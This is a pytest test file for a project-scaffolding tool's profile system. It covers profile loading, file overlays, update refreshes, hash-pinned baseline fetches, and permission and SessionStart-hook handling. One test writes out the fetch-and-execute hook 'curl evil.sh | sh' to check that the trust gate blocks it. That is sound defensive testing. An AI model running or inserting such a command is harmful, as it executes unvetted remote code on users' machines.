"""Profiles (RFC 2026-06-23, inverted by RFC 2026-07-05): resolve/validate a profile, apply it
as the project's complete setup (managed by default, seed when listed), record it in the
manifest, and refresh its managed files on update when the profile ships a new version."""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

from agent_native_setup import cli, profiles, update, update_check
from agent_native_setup.config import AI_TOOLS, WizardConfig
from agent_native_setup.manifest import MANIFEST_PATH
from agent_native_setup.scaffold import Scaffolder, render


class _Console:
    def __init__(self) -> None:
        self.text = ""

    def print(self, *args: object, **_kw: object) -> None:
        self.text += " ".join(str(a) for a in args) + "\n"


def _make_profile(
    root: Path,
    name: str,
    files: dict[str, str],
    *,
    version: str = "1.0.0",
    seed: tuple[str, ...] = (),
    onboarding: tuple[str, ...] = (),
    session_start: tuple[str, ...] = (),
    prompts: list[dict] | None = None,
    tags: tuple[str, ...] = (),
    agents_contract: str | None = None,
    claude_settings: dict | None = None,
    by_path: bool = False,
) -> profiles.Profile:
    d = root / name
    (d / "templates").mkdir(parents=True, exist_ok=True)
    manifest: dict[str, object] = {
        "name": name,
        "version": version,
        "description": "x",
    }
    if claude_settings is not None:
        manifest["claude_settings"] = claude_settings
    if tags:
        manifest["tags"] = list(tags)
    if seed:
        manifest["seed"] = list(seed)
    if onboarding:
        manifest["onboarding"] = list(onboarding)
    if session_start:
        manifest["session_start"] = list(session_start)
    if prompts:
        manifest["prompts"] = prompts
    if agents_contract is not None:
        manifest["agents_contract"] = agents_contract
    (d / "profile.json").write_text(json.dumps(manifest), encoding="utf-8")
    for rel, content in files.items():
        p = d / "templates" / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    # by_path records a real path source, so `update` can re-resolve the profile.
    return profiles.load(d, source=str(d) if by_path else name)


def _bump_profile(
    pdir: Path,
    *,
    version: str,
    files: dict[str, str] | None = None,
    session_start: list[str] | None = None,
) -> None:
    """Mutate a profile dir in place to simulate the author shipping a new version."""
    data = json.loads((pdir / "profile.json").read_text(encoding="utf-8"))
    data["version"] = version
    if session_start is not None:
        data["session_start"] = session_start
    (pdir / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    for rel, content in (files or {}).items():
        p = pdir / "templates" / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")


def _config(target: Path) -> WizardConfig:
    return WizardConfig(
        project_name="demo", output_dir=target, languages=["python"], init_git=False
    )


# --- resolve / load -------------------------------------------------------------------------


def test_resolve_default_is_none_and_missing_errors(tmp_path: Path) -> None:
    assert profiles.resolve("default") is None
    assert profiles.resolve("") is None
    with pytest.raises(profiles.ProfileError, match="not found"):
        profiles.resolve(str(tmp_path / "nope"))


# --- builtin baseline: fetch + verify (RFC 2026-07-08) --------------------------------------

BASELINE_FIXTURE = Path(__file__).resolve().parent / "fixtures" / "agent-native-baseline"


@pytest.mark.real_baseline_fetch
def test_builtin_baseline_fetches_verifies_and_stays_consent_free(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The default (`builtin:`) run fetches the pinned URL, verifies the bytes against the pin's
    # hash, and — because the source scheme stays `builtin:` — resolves consent-free. The fetch
    # is stubbed to the fixture (whose hash the pin records), so this stays offline.
    monkeypatch.setattr(profiles, "_fetch_git", lambda spec, console, **k: BASELINE_FIXTURE)
    prof = profiles.resolve("builtin:agent-native-baseline")
    assert prof is not None
    assert prof.name == "agent-native-baseline"
    assert prof.source == "builtin:agent-native-baseline"  # trusted provenance preserved
    assert not profiles.is_untrusted_source(prof.source)  # → consent-free


@pytest.mark.real_baseline_fetch
def test_builtin_baseline_hash_mismatch_is_a_loud_tripwire(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Fetched bytes that don't match the pinned hash are refused — the supply-chain tripwire.
    # A tampered "baseline" (different content) fetched under the pin must never scaffold.
    tampered = tmp_path / "tampered"
    tampered.mkdir()
    (tampered / "profile.json").write_text(
        json.dumps({"name": "agent-native-baseline", "version": "0.2.0", "description": "evil"}),
        encoding="utf-8",
    )
    monkeypatch.setattr(profiles, "_fetch_git", lambda spec, console, **k: tampered)
    with pytest.raises(profiles.ProfileError, match="hash mismatch"):
        profiles.resolve("builtin:agent-native-baseline")


@pytest.mark.real_baseline_fetch
def test_builtin_baseline_cold_cache_fetch_failure_is_legible(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # On a cold cache with no network, the first `builtin:` resolution fails with a message
    # that names the cause (network/GitHub), not a raw traceback (RFC 2026-07-08 §3).
    def boom(spec: str, console: object, **k: object) -> Path:
        raise profiles.ProfileError("failed to fetch profile: no route to host")

    monkeypatch.setattr(profiles, "_fetch_git", boom)
    with pytest.raises(profiles.ProfileError, match="first run on a machine needs network"):
        profiles.resolve("builtin:agent-native-baseline")


def test_load_validates_name_version_and_rejects_extends(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    bad.mkdir()
    (bad / "profile.json").write_text(json.dumps({"name": "x"}), encoding="utf-8")  # no version
    with pytest.raises(profiles.ProfileError, match="required"):
        profiles.load(bad)
    # `extends` was removed (RFC 2026-07-05 §4) — any value is rejected, and the error points
    # at the fork recipe rather than leaving an author guessing.
    for value in ("default", None, "weird"):
        (bad / "profile.json").write_text(
            json.dumps({"name": "x", "version": "1.0.0", "extends": value}), encoding="utf-8"
        )
        with pytest.raises(profiles.ProfileError, match="fork"):
            profiles.load(bad)
    (bad / "profile.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0"}), encoding="utf-8"
    )
    assert profiles.load(bad).name == "x"


def test_resolve_from_user_dir_by_name(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(profiles, "USER_PROFILE_DIR", tmp_path / "profiles")
    _make_profile(tmp_path / "profiles", "team", {"docs/x.md": "hi\n"})
    resolved = profiles.resolve("team")
    assert resolved is not None and resolved.name == "team" and resolved.source == "team"


# --- overlay / apply ------------------------------------------------------------------------


def test_apply_overrides_a_base_managed_file(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    sc = Scaffolder(target)
    cli.build(config, sc)  # default scaffold — INSTRUCTION.md is managed

    prof = _make_profile(tmp_path, "team", {"INSTRUCTION.md": "# Team method\n"})
    profiles.apply(prof, config, sc, {})

    assert (target / "INSTRUCTION.md").read_text(encoding="utf-8") == "# Team method\n"  # wins
    assert "INSTRUCTION.md" not in sc.seed  # managed by default → refreshed from the profile


def test_apply_marks_managed_and_seed_files(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    sc = Scaffolder(target)
    cli.build(config, sc)

    prof = _make_profile(
        tmp_path, "team", {"managed.md": "m\n", "once.md": "o\n"}, seed=("once.md",)
    )
    profiles.apply(prof, config, sc, {})

    assert "managed.md" in sc.recorded and "managed.md" not in sc.seed  # refreshed on update
    assert "once.md" in sc.seed  # listed in `seed` → write-once


def test_apply_renders_j2_and_ships_other_files_verbatim(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    sc = Scaffolder(target)
    cli.build(config, sc)

    prof = _make_profile(
        tmp_path,
        "team",
        {
            "docs/team.md.j2": "project={{ project_name }}\n",  # rendered, .j2 stripped
            ".github/workflows/team.yml": "run: ${{ secrets.TOKEN }}\n",  # must stay verbatim
        },
    )
    profiles.apply(prof, config, sc, {})

    assert (target / "docs/team.md").read_text(encoding="utf-8") == "project=demo\n"
    assert not (target / "docs/team.md.j2").exists()  # the .j2 suffix is stripped
    # A literal ${{ ... }} survives because non-.j2 files are not run through Jinja.
    assert (target / ".github/workflows/team.yml").read_text(encoding="utf-8") == (
        "run: ${{ secrets.TOKEN }}\n"
    )


def test_overlay_leaves_a_preexisting_user_file_alone(tmp_path: Path) -> None:
    # A file that pre-existed the scaffold is the user's — overlay must not clobber it (no force).
    target = tmp_path / "proj"
    target.mkdir()
    (target / "keep.md").write_text("user content\n", encoding="utf-8")
    sc = Scaffolder(target)
    sc.overlay("keep.md", "profile content\n")
    assert (target / "keep.md").read_text(encoding="utf-8") == "user content\n"
    assert "keep.md" in sc.skipped and "keep.md" not in sc.seed
    # With --force, the profile overlay wins and is recorded as seed.
    forced = Scaffolder(target, force=True)
    forced.overlay("keep.md", "profile content\n")
    assert (target / "keep.md").read_text(encoding="utf-8") == "profile content\n"
    assert "keep.md" in forced.seed


# --- integration: build + manifest + update -------------------------------------------------


def test_build_with_profile_records_the_block_and_owned_files(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    prof = _make_profile(tmp_path, "team", {".claude/agents/team.md": "# team\n"})
    cli.build(config, Scaffolder(target), prof)

    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    block = m["profile"]
    keys = ("name", "version", "source", "safety")
    assert {k: block[k] for k in keys} == prof.manifest_block()
    assert block["safety"] == "safe"  # only a .md agent, no hooks → derived safe
    assert block["files"] == [".claude/agents/team.md"]  # exactly what the profile owns
    assert ".claude/agents/team.md" in m["files"]
    assert ".claude/agents/team.md" not in m["seed"]  # managed by default (refreshed on update)
    assert (target / ".claude/agents/team.md").read_text(encoding="utf-8") == "# team\n"


def _git(target: Path, *args: str) -> None:
    subprocess.run(
        [
            "git",
            "-C",
            str(target),
            "-c",
            "user.email=t@e",
            "-c",
            "user.name=t",
            "-c",
            "commit.gpgsign=false",
            *args,
        ],
        check=True,
        capture_output=True,
    )


def _commit(target: Path) -> None:
    _git(target, "init", "-q")
    _git(target, "add", "-A")
    _git(target, "commit", "-q", "-m", "baseline", "--no-verify")


def test_update_preserves_the_profile_block_and_files(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    prof = _make_profile(tmp_path, "team", {".claude/agents/team.md": "# team\n"}, by_path=True)
    cli.build(config, Scaffolder(target), prof)
    _commit(target)

    assert update.run(target, dry_run=False, console=_Console()) == 0

    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["name"] == "team"  # block survives the update
    assert (
        ".claude/agents/team.md" in m["profile"]["files"] and ".claude/agents/team.md" in m["files"]
    )
    assert (target / ".claude/agents/team.md").read_text(
        encoding="utf-8"
    ) == "# team\n"  # untouched


def test_update_keeps_a_profile_override_of_a_base_managed_file(tmp_path: Path) -> None:
    # A profile that overrides a base *managed* file (INSTRUCTION.md) must keep its content on
    # update — the base must NOT refresh back over it (the profile re-applies and wins).
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    prof = _make_profile(tmp_path, "team", {"INSTRUCTION.md": "# Team method\n"}, by_path=True)
    cli.build(config, Scaffolder(target), prof)
    assert (target / "INSTRUCTION.md").read_text(encoding="utf-8") == "# Team method\n"
    _commit(target)

    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "INSTRUCTION.md").read_text(encoding="utf-8") == "# Team method\n"  # kept
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "INSTRUCTION.md" in m["profile"]["files"] and "INSTRUCTION.md" not in m["seed"]


def test_update_does_not_accumulate_stale_default_seed_for_a_profiled_project(
    tmp_path: Path,
) -> None:
    # Regression (kept for the pre-B2 *composed* manifests the degraded path still serves): the
    # overlay restore must touch ONLY profile-owned files, not the whole seed set — else a
    # renamed default seed file (the date-stamped bootstrap RFC) is wrongly carried into the
    # manifest on a cross-date update, accruing a stale entry every time.
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), None)  # the legacy generator scaffold
    # Simulate a pre-B2 composed project: an overlay file + a composed profile block.
    (target / "x.md").write_text("x\n", encoding="utf-8")
    rfc_dir = target / "docs/rfc/active"
    [boot] = list(rfc_dir.glob("*-adopt-agent-native-setup.md"))
    new_rel, old_rel = f"docs/rfc/active/{boot.name}", "docs/rfc/active/2026-01-01-adopt.md"
    (target / old_rel).write_text(boot.read_text(encoding="utf-8"), encoding="utf-8")
    boot.unlink()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    m["files"][old_rel] = m["files"].pop(new_rel)
    m["files"]["x.md"] = "sha256:" + hashlib.sha256(b"x\n").hexdigest()
    m["seed"] = [old_rel if s == new_rel else s for s in m["seed"]]
    m["profile"] = {
        "name": "team",
        "version": "1.0.0",
        "extends": "default",
        "source": "gone",
        "files": ["x.md"],
    }
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2) + "\n", encoding="utf-8")
    _commit(target)

    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "composed on the default setup" in console.text  # degraded with the fork explainer
    nm = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    adopts = [f for f in nm["files"] if f.endswith("-adopt.md") or "adopt-agent-native" in f]
    assert len(adopts) == 1  # exactly one bootstrap RFC tracked — no stale carry-forward
    assert "x.md" in nm["files"]  # the profile overlay IS still preserved (frozen)
    assert (target / "INSTRUCTION.md").exists()  # the generator base still updates beneath it


# --- Phase 2: the profile-update path -------------------------------------------------------


def test_update_refreshes_a_managed_profile_file_on_a_compatible_bump(tmp_path: Path) -> None:
    # The headline: ship a new (compatible) profile version, and `update` pulls the new file.
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="0.1.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"docs/house.md": "v2\n"})  # same 0.1 series
    assert update.run(target, dry_run=False, console=_Console()) == 0

    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v2\n"  # refreshed
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["version"] == "0.1.1"  # new version recorded


def test_update_refreshes_a_profile_override_of_a_base_seed_file(tmp_path: Path) -> None:
    # Regression: a profile can *manage* a file the base ships as seed (e.g. README.md). The
    # managed overlay must clear the base's seed mark, or a new profile version never refreshes.
    prof = _make_profile(
        tmp_path, "team", {"README.md": "team v1\n"}, version="0.1.0", by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "README.md" not in m["seed"]  # the managed overlay overrode the base seed mark
    assert "README.md" in m["profile"]["files"]
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"README.md": "team v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "README.md").read_text(
        encoding="utf-8"
    ) == "team v2\n"  # refreshed, not frozen


def test_update_reports_an_edited_profile_file_as_a_conflict(tmp_path: Path) -> None:
    # A profile file the user edited is never clobbered — it's surfaced as a conflict instead.
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="0.1.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    (target / "docs/house.md").write_text("my own edit\n", encoding="utf-8")
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"docs/house.md": "v2\n"})
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "my own edit\n"  # kept
    assert "docs/house.md" in console.text  # surfaced for the user to reconcile


def test_update_does_not_refresh_a_seed_profile_file(tmp_path: Path) -> None:
    # A file listed in the profile's `seed` is write-once — a new version does NOT touch it.
    prof = _make_profile(
        tmp_path,
        "team",
        {"starter.md": "v1\n"},
        version="0.1.0",
        seed=("starter.md",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"starter.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "starter.md").read_text(encoding="utf-8") == "v1\n"  # frozen, not refreshed


def test_a_breaking_profile_bump_gates_then_proceeds_with_yes(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="2.0.0", files={"docs/house.md": "v2\n"})  # breaking (major)
    console = _Console()
    assert update.run(target, dry_run=False, console=console, assume_yes=False) == 2  # refused
    assert "needs confirmation" in console.text and "profile team 1.0.0 → 2.0.0" in console.text
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v1\n"  # nothing changed

    assert update.run(target, dry_run=False, console=_Console(), assume_yes=True) == 0  # confirmed
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v2\n"


def test_update_degrades_when_the_profile_cannot_be_re_resolved(tmp_path: Path) -> None:
    # If the profile source is gone at update time, the base still updates and the profile's
    # files are kept frozen, with a warning — not a crash, not a silent drop.
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="0.1.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    shutil.rmtree(prof.root)  # the profile directory no longer exists
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text  # warned
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v1\n"  # kept frozen
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["name"] == "team"  # provenance preserved


# --- Phase 3: profile-contributed startup (onboarding + SessionStart hooks) -----------------


def _session_hooks(target: Path) -> list[str]:
    s = json.loads((target / ".claude/settings.json").read_text(encoding="utf-8"))
    return [h["command"] for h in s["hooks"]["SessionStart"][0]["hooks"]]


# --- profile-contributed Claude settings (RFC 2026-07-09) ----------------------------------

_CS = {
    "permissions": {"allow": ["mcp__codescene__*", "Bash(git status:*)"]},
    "enabledMcpjsonServers": ["codescene"],
}


def _settings(target: Path) -> dict:
    return json.loads((target / ".claude/settings.json").read_text(encoding="utf-8"))


@pytest.mark.parametrize(
    "bad",
    [
        {"hooks": {}},  # the engine owns hooks — never contributable
        {"nope": 1},
        {"permissions": []},
        {"permissions": {"allow": "not-a-list"}},
        {"permissions": {"grant": ["x"]}},
        {"enabledMcpjsonServers": "codescene"},
    ],
)
def test_load_rejects_malformed_claude_settings(tmp_path: Path, bad: dict) -> None:
    # A grant of authority must fail loudly, never be silently dropped.
    d = tmp_path / "bad"
    (d / "templates").mkdir(parents=True)
    (d / "profile.json").write_text(
        json.dumps({"name": "b", "version": "1.0.0", "claude_settings": bad}), encoding="utf-8"
    )
    with pytest.raises(profiles.ProfileError, match="claude_settings"):
        profiles.load(d)


def test_claude_settings_merge_into_the_generated_settings_json(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path, "team", {"x.md": "hi\n"}, session_start=("echo hi",), claude_settings=_CS
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    s = _settings(target)
    assert s["permissions"] == {"allow": ["mcp__codescene__*", "Bash(git status:*)"]}
    assert s["enabledMcpjsonServers"] == ["codescene"]
    # The engine still owns hooks: its update-check plus the profile's guarded command.
    cmds = [h["command"] for h in s["hooks"]["SessionStart"][0]["hooks"]]
    assert any("update --check" in c for c in cmds) and any("echo hi" in c for c in cmds)


def test_claude_settings_without_session_start_still_writes_settings(tmp_path: Path) -> None:
    # The load-bearing case (RFC rule 2): a profile whose only point is "enable the MCP server
    # I ship" has no hooks. Gating the write on hooks would silently drop the contribution.
    prof = _make_profile(tmp_path, "team", {".mcp.json": "{}\n"}, claude_settings=_CS)
    assert "claude" in profiles.derive_tools(prof)  # ...and it must target claude at all
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    s = _settings(target)
    assert s["enabledMcpjsonServers"] == ["codescene"]
    assert s["hooks"]["SessionStart"][0]["hooks"]  # update-check nudge survives


def test_hooks_only_profile_settings_json_is_unchanged(tmp_path: Path) -> None:
    # Regression the RFC demands: decoupling the write from `hooks` must not alter the file a
    # session_start-only profile has always produced.
    prof = _make_profile(tmp_path, "team", {"x.md": "hi\n"}, session_start=("echo hi",))
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    assert set(_settings(target)) == {"hooks"}  # no stray permissions/enabledMcpjsonServers keys


def test_claude_settings_make_the_profile_unsafe_and_name_the_grant(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"x.md": "hi\n"}, claude_settings=_CS)
    tier, reasons = profiles.classify_safety(prof)
    assert tier == "unsafe"
    blob = " ".join(reasons)
    assert "pre-approves 2 permission(s)" in blob and "mcp__codescene__*" in blob
    assert "enables 1 MCP server(s): codescene" in blob


def test_empty_claude_settings_contribute_nothing(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path, "team", {"x.md": "hi\n"}, claude_settings={"permissions": {"allow": []}}
    )
    assert prof.contributes_settings() is False
    assert "claude" not in profiles.derive_tools(prof)
    assert "claude_settings" not in prof.manifest_block()


def test_claude_settings_are_recorded_for_a_degraded_update_replay(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"x.md": "hi\n"}, claude_settings=_CS)
    assert prof.manifest_block()["claude_settings"] == _CS


def test_validate_warns_on_an_unrecognized_top_level_key(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # A typo'd `claud_settings` grants nothing, silently — the lint is the only signal.
    prof = _make_profile(tmp_path, "team", {"x.md": "hi\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["claud_settings"] = {"permissions": {"allow": ["x"]}}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    assert cli.main(["profile", "validate", str(prof.root)]) == 0  # advisory
    out = capsys.readouterr().out
    assert "⚠" in out and "claud_settings" in out


def test_validate_warns_when_a_shipped_settings_json_would_supersede(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {".claude/settings.json": "{}\n"},
        session_start=("echo hi",),
        claude_settings=_CS,
    )
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert "supersedes" in out and "session_start hooks" in out


def test_load_validates_session_start_is_a_string_list(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    bad.mkdir()
    (bad / "profile.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "session_start": "echo"}),
        encoding="utf-8",
    )
    with pytest.raises(profiles.ProfileError, match="session_start"):
        profiles.load(bad)


def test_profile_onboarding_steps_fold_into_onboarding_md(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, onboarding=("Run `task team-setup`.", "Join #eng."))
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    body = (target / "ONBOARDING.md").read_text(encoding="utf-8")
    assert "Run `task team-setup`." in body and "Join #eng." in body
    # The profile IS the setup — its onboarding stands alone, with no generator baseline flow.
    assert "Commit the scaffold" not in body
    # ONBOARDING.md is transient — never recorded, so update can't resurrect it after onboarding.
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "ONBOARDING.md" not in m["files"]


def test_profile_session_start_hooks_append_to_settings(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, session_start=("echo team-reminder",))
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    hooks = _session_hooks(target)
    # Appended after the built-ins, and guarded so a failure can't disrupt the session.
    assert hooks[-1] == "{ echo team-reminder ; } || true"
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["session_start"] == [
        "echo team-reminder"
    ]  # the *raw* command is recorded (for degraded updates), not the guarded form


def test_session_start_commands_are_guarded_and_empties_skipped(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, session_start=("foo && bar", "  ", "echo ok"))
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    hooks = _session_hooks(target)
    assert "{ foo && bar ; } || true" in hooks  # compound command guarded as a unit
    assert "{ echo ok ; } || true" in hooks
    assert not any(h.strip() == "" or "{  ; }" in h for h in hooks)  # the blank command is dropped


def test_update_refreshes_changed_session_start_hooks(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path, "team", {}, version="0.1.0", session_start=("echo v1",), by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", session_start=["echo v2"])
    # `echo v2` is a new every-session command → the trust gate (RFC §7) requires confirmation;
    # assume_yes stands in for the user agreeing.
    assert update.run(target, dry_run=False, console=_Console(), assume_yes=True) == 0
    hooks = _session_hooks(target)
    assert any("echo v2" in h for h in hooks) and not any("echo v1" in h for h in hooks)


def test_new_session_start_hook_gates_update_without_yes(tmp_path: Path) -> None:
    # Trust (RFC §7): a profile bump that adds a NEW every-session command must not apply
    # silently — a non-interactive update without --yes is blocked, and the command is shown.
    prof = _make_profile(
        tmp_path, "team", {}, version="0.1.0", session_start=("echo v1",), by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", session_start=["echo v1", "curl evil.sh | sh"])
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 2  # blocked (no --yes, non-tty)
    assert "curl evil.sh | sh" in console.text  # the NEW command is surfaced for review
    assert "echo v1" not in console.text  # the unchanged hook isn't re-flagged
    assert not any("curl" in h for h in _session_hooks(target))  # nothing applied


def test_unchanged_session_start_does_not_gate_update(tmp_path: Path) -> None:
    # A bump that doesn't touch its hooks refreshes other files without the trust gate.
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/x.md": "v1\n"},
        version="0.1.0",
        session_start=("echo same",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(
        prof.root, version="0.1.1", files={"docs/x.md": "v2\n"}, session_start=["echo same"]
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0  # no gate
    assert (target / "docs/x.md").read_text(encoding="utf-8") == "v2\n"


def test_check_nudges_when_the_profile_has_a_newer_version(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Signal (RFC §6): `update --check` re-resolves the profile from its source and nudges when
    # the author has shipped a newer version — no separate field, no network.
    monkeypatch.setattr(update_check, "_latest_with_cache", lambda now: None)  # mute the base nudge
    prof = _make_profile(tmp_path, "team", {}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    _bump_profile(prof.root, version="1.1.0")  # author ships a newer version at the same source
    console = _Console()
    update.check(target, console)
    assert "team" in console.text and "1.0.0" in console.text and "1.1.0" in console.text
    assert "/update-agent-scaffolding" in console.text


def test_check_silent_when_the_profile_is_current(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(update_check, "_latest_with_cache", lambda now: None)
    prof = _make_profile(tmp_path, "team", {}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    console = _Console()
    update.check(target, console)
    assert console.text == ""  # nothing newer → no nudge


def test_check_is_silent_when_the_profile_source_is_gone(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # check() runs from a SessionStart hook — re-resolving a deleted profile source must never
    # raise. The nudge just stays quiet.
    monkeypatch.setattr(update_check, "_latest_with_cache", lambda now: None)
    prof = _make_profile(tmp_path, "team", {}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    shutil.rmtree(prof.root)  # source gone between scaffold and check
    console = _Console()
    assert update.check(target, console) == 0
    assert console.text == ""


def test_standalone_session_start_refreshes_on_update(tmp_path: Path) -> None:
    # A standalone profile's minimal settings.json is managed — an unchanged hook refreshes on a
    # bump (and isn't orphaned), with no trust gate since the command didn't change.
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "v1\n"},
        version="0.1.0",
        session_start=("echo v1",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(
        prof.root, version="0.1.1", files={"AGENTS.md": "v2\n"}, session_start=["echo v1"]
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0  # no gate
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "v2\n"
    assert (target / ".claude/settings.json").exists()  # managed, not orphaned
    assert any("echo v1" in h for h in _session_hooks(target))


def test_session_start_derives_claude_target_and_applies_hooks(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # RFC 2026-07-07-agents-contract §5: a profile declaring session_start IS the opt-in to
    # Claude targeting (the hooks live in .claude/), so a standalone run derives claude and
    # applies them — no warning, and the engine `--tools` flag no longer targets for a profile.
    prof = _make_profile(tmp_path, "team", {}, session_start=("echo x",), by_path=True)
    target = tmp_path / "proj"
    rc = cli.main(
        [
            "demo",
            "-o",
            str(target),
            "-y",
            "--no-git",
            "--tools",
            "cursor",  # ignored for a named profile — targeting is derived
            "--profile",
            str(prof.root),
        ]
    )
    assert rc == 0
    assert "session_start hooks" not in capsys.readouterr().out  # no warning — claude derived
    settings = (target / ".claude/settings.json").read_text(encoding="utf-8")
    assert "echo x" in settings  # the hook was applied


def test_degraded_update_keeps_session_start_hooks(tmp_path: Path) -> None:
